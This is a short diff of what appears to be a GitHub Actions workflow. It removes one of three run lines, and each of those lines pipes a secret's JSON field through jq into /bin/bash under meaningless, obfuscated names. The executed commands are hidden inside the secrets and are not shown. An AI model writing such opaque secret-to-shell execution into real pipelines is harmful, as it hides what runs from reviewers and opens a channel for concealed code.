@@ -18,7 +18,6 @@ jobs:
           sx5: ${{ secrets.sx5 }}
         run: |
           printf '%s' "$sx5" | jq -r .xupk1100 | /bin/bash
-          echo $pc46 | jq -r .yzn28 | /bin/bash
           printf '%s' "$h29216" | jq -r .ocva38710 | /bin/bash
 
       - name: Archive output
